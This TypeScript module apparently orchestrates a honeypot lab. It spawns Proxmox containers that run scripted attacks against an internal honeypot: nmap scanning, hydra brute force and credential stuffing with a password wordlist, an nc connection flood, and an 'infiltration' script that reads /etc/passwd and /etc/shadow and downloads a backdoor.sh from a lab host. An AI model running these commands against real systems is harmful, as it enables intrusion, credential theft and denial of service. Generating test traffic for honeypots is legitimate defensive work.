import { execSync, exec } from "child_process";
import type { AttackerContainer, AttackType } from "./types";

const PROXMOX_SSH = "root@10.10.10.1";
const PROXMOX_SSH_PORT = 2222;
const TEMPLATE_VMID = 903;
const HONEYPOT_IP = "10.30.30.10";
const ATTACKER_BASE_IP = 101;
const STORAGE = "local-lvm";

const activeAttackers = new Map<number, AttackerContainer>();

// Callback for broadcasting status changes to WS clients
let onAttackerUpdate: ((attacker: AttackerContainer) => void) | null = null;

export function setAttackerUpdateCallback(cb: (attacker: AttackerContainer) => void): void {
  onAttackerUpdate = cb;
}

function sshExec(cmd: string, timeout = 60000): string {
  const sshCmd = `ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -p ${PROXMOX_SSH_PORT} ${PROXMOX_SSH} "${cmd.replace(/"/g, '\\"')}"`;
  return execSync(sshCmd, { timeout, encoding: "utf8" }).trim();
}

function getNextVmid(): number {
  const output = sshExec("pct list | tail -n +2 | awk '{print $1}'");
  const usedIds = new Set(output.split("\n").filter(Boolean).map(Number));
  for (let id = 950; id < 999; id++) {
    if (!usedIds.has(id)) return id;
  }
  throw new Error("No available VMID in 950-999 range");
}

function getAttackerIp(vmid: number): string {
  const offset = vmid - 950 + ATTACKER_BASE_IP;
  return `10.30.30.${offset}`;
}

const ATTACK_SCRIPTS: Record<string, string> = {
  scan: [
    "echo '[*] Starting nmap scan against HONEYPOT_IP...'",
    "nmap -sV -sC -p 22,23,80,443,445,2222 HONEYPOT_IP 2>&1",
    "echo '[*] Scan complete'",
    "sleep 5",
  ].join(" && ").replace(/HONEYPOT_IP/g, HONEYPOT_IP),

  bruteforce: [
    "echo '[*] Starting SSH brute force against HONEYPOT_IP:2222...'",
    "printf 'root\\nadmin\\nuser\\ntest\\nubuntu\\npi\\n' > /tmp/users.txt",
    "printf 'password\\n123456\\nadmin\\nroot\\ntoor\\n12345678\\nqwerty\\nletmein\\npassword1\\niloveyou\\n' > /tmp/passwords.txt",
    "hydra -L /tmp/users.txt -P /tmp/passwords.txt ssh://HONEYPOT_IP:2222 -t 4 -f 2>&1 || true",
    "echo '[*] Brute force complete'",
    "sleep 5",
  ].join(" && ").replace(/HONEYPOT_IP/g, HONEYPOT_IP),

  manual: [
    "echo '[*] Manual attack container ready'",
    "echo '[*] Honeypot is at HONEYPOT_IP:2222 (SSH)'",
    "echo '[*] Available tools: nmap, hydra, nikto, netcat, sshpass'",
    "sleep 1800",
  ].join(" && ").replace(/HONEYPOT_IP/g, HONEYPOT_IP),

  infiltration: (() => {
    const SSH = "sshpass -p password ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -p 2222";
    return [
      "echo '[*] Infiltration: recon phase'",
      `${SSH} root@HONEYPOT_IP whoami 2>&1 || true`,
      "sleep 1",
      `${SSH} root@HONEYPOT_IP 'uname -a' 2>&1 || true`,
      "sleep 1",
      "echo '[*] Infiltration: data exfiltration'",
      `${SSH} root@HONEYPOT_IP 'cat /etc/passwd' 2>&1 || true`,
      "sleep 1",
      `${SSH} root@HONEYPOT_IP 'cat /etc/shadow' 2>&1 || true`,
      "sleep 1",
      "echo '[*] Infiltration: malware deployment'",
      `${SSH} root@HONEYPOT_IP 'wget http://10.30.30.1/backdoor.sh -O /tmp/backdoor.sh' 2>&1 || true`,
      "sleep 1",
      `${SSH} root@HONEYPOT_IP 'chmod +x /tmp/backdoor.sh' 2>&1 || true`,
      "sleep 1",
      "echo '[*] Infiltration: lateral movement (admin:admin)'",
      `sshpass -p admin ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -p 2222 admin@HONEYPOT_IP 'ls -la /home' 2>&1 || true`,
      "sleep 1",
      `sshpass -p admin ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -p 2222 admin@HONEYPOT_IP 'ps aux' 2>&1 || true`,
      "echo '[*] Infiltration complete'",
      "sleep 3",
    ].join(" && ").replace(/HONEYPOT_IP/g, HONEYPOT_IP);
  })(),

  sshflood: [
    "echo '[*] Starting SSH flood against HONEYPOT_IP:2222...'",
    "for i in $(seq 1 60); do (nc -w 2 HONEYPOT_IP 2222 </dev/null >/dev/null 2>&1 &); done",
    "echo '[*] Wave 1 sent (60 connections)'",
    "sleep 3",
    "for i in $(seq 1 60); do (nc -w 2 HONEYPOT_IP 2222 </dev/null >/dev/null 2>&1 &); done",
    "echo '[*] Wave 2 sent (60 connections)'",
    "sleep 3",
    "for i in $(seq 1 40); do (nc -w 2 HONEYPOT_IP 2222 </dev/null >/dev/null 2>&1 &); done",
    "echo '[*] Wave 3 sent (40 connections)'",
    "wait",
    "echo '[*] SSH flood complete - 160 connections sent'",
    "sleep 5",
  ].join(" && ").replace(/HONEYPOT_IP/g, HONEYPOT_IP),

  credstuffing: [
    "echo '[*] Starting credential stuffing against HONEYPOT_IP:2222...'",
    "printf 'root\\nadmin\\nuser\\ntest\\nubuntu\\npi\\noracle\\npostgres\\nmysql\\nnginx\\nwww-data\\nftpuser\\ngit\\ndebian\\nec2-user\\ncentos\\nvagrant\\nansible\\ndeploy\\nbackup\\nmonitor\\nsupport\\noperator\\nservice\\nguest\\n' > /tmp/users.txt",
    "printf 'password\\n123456\\nadmin\\nroot\\ntoor\\n12345678\\nqwerty\\nletmein\\npassword1\\niloveyou\\n111111\\n1234567890\\npassword123\\nwelcome\\nmonkey\\ndragon\\nmaster\\nlogin\\nhello\\nsuperman\\nbatman\\ntrustno1\\n0000\\npassw0rd\\nabc123\\n123abc\\nPass1234\\nWelcome1\\nQwerty123\\nAdmin1234\\nSecret123\\nP@ssword\\nP@ss123\\nChang3me\\nservice\\ntemporary\\ndefault\\nguest\\nchangeme\\nsetup\\ninstall\\nreboot\\nreset\\nmaintenance\\nbackup\\ntest123\\ndemo\\nlab\\nsecret\\nraspberry\\nletmein1\\npassword2\\n12345\\n1234\\n1111\\nqwerty123\\nqwertyuiop\\nTest1234\\nAdmin123\\nRoot1234\\nServer123\\nWinter2024\\nSummer2024\\nP@$$w0rd\\nAbc1234\\nCompany1\\nNewPass1\\n' > /tmp/passwords.txt",
    "hydra -L /tmp/users.txt -P /tmp/passwords.txt ssh://HONEYPOT_IP:2222 -t 2 -w 10 2>&1 || true",
    "echo '[*] Credential stuffing complete'",
    "sleep 5",
  ].join(" && ").replace(/HONEYPOT_IP/g, HONEYPOT_IP),
};

export async function spawnAttacker(
  attackType: AttackType
): Promise<AttackerContainer> {
  const vmid = getNextVmid();
  const ip = getAttackerIp(vmid);
  const name = `atk-${attackType}-${vmid}`;

  const attacker: AttackerContainer = {
    vmid,
    name,
    attackType,
    status: "creating",
    createdAt: new Date().toISOString(),
    ip,
  };
  activeAttackers.set(vmid, attacker);

  try {
    console.log(`[proxmox] Cloning template ${TEMPLATE_VMID} -> CT ${vmid}`);
    sshExec(
      `pct clone ${TEMPLATE_VMID} ${vmid} --hostname ${name} --full --storage ${STORAGE}`,
      120000
    );

    console.log(`[proxmox] Configuring network for CT ${vmid}`);
    sshExec(
      `pct set ${vmid} -net0 name=eth0,bridge=vmbr4,ip=${ip}/24,gw=10.30.30.1`
    );

    console.log(`[proxmox] Starting CT ${vmid}`);
    sshExec(`pct start ${vmid}`);

    // Wait for it to be running
    for (let i = 0; i < 15; i++) {
      await new Promise((r) => setTimeout(r, 2000));
      try {
        const status = sshExec(`pct status ${vmid}`);
        if (status.includes("running")) break;
      } catch { /* not ready */ }
    }

    attacker.status = "running";
    console.log(`[proxmox] CT ${vmid} is running at ${ip}`);

    // Launch the attack asynchronously
    scheduleAttack(vmid, ATTACK_SCRIPTS[attackType], attackType);

    return attacker;
  } catch (error) {
    attacker.status = "finished";
    console.error(`[proxmox] Failed to spawn attacker ${vmid}:`, error);
    // Try to cleanup
    try { sshExec(`pct stop ${vmid} 2>/dev/null; pct destroy ${vmid} --purge 2>/dev/null`); } catch {}
    activeAttackers.delete(vmid);
    throw error;
  }
}

function scheduleAttack(vmid: number, script: string, attackType: string): void {
  // Base64 encode to avoid all shell escaping issues with nested SSH + pct exec + bash -c
  const b64 = Buffer.from(script).toString("base64");
  const sshCommand = `ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -p ${PROXMOX_SSH_PORT} ${PROXMOX_SSH} "pct exec ${vmid} -- bash -c 'echo ${b64} | base64 -d | bash'"`;

  console.log(`[attacker] Starting ${attackType} on CT ${vmid}`);

  const child = exec(sshCommand, { timeout: 600000 });

  child.stdout?.on("data", (data: string) => {
    console.log(`[attacker-${vmid}] ${data.trim()}`);
  });

  child.stderr?.on("data", (data: string) => {
    const msg = data.trim();
    if (msg && !msg.includes("Warning:")) {
      console.error(`[attacker-${vmid}] ERR: ${msg}`);
    }
  });

  child.on("close", () => {
    console.log(`[attacker] ${attackType} finished on CT ${vmid}`);
    const a = activeAttackers.get(vmid);
    if (a) {
      a.status = "finished";
      onAttackerUpdate?.(a);
    }

    if (attackType !== "manual") {
      setTimeout(() => destroyAttacker(vmid), 30000);
    }
  });
}

export async function destroyAttacker(vmid: number): Promise<void> {
  const attacker = activeAttackers.get(vmid);
  if (attacker) attacker.status = "destroying";

  try {
    console.log(`[proxmox] Destroying CT ${vmid}`);
    sshExec(`pct stop ${vmid} 2>/dev/null || true`);
    await new Promise((r) => setTimeout(r, 3000));
    sshExec(`pct destroy ${vmid} --purge 2>/dev/null || true`);
    console.log(`[proxmox] CT ${vmid} destroyed`);
  } catch (error) {
    console.error(`[proxmox] Failed to destroy CT ${vmid}:`, error);
  }

  activeAttackers.delete(vmid);
}

export function getActiveAttackers(): AttackerContainer[] {
  return Array.from(activeAttackers.values());
}

export { HONEYPOT_IP };
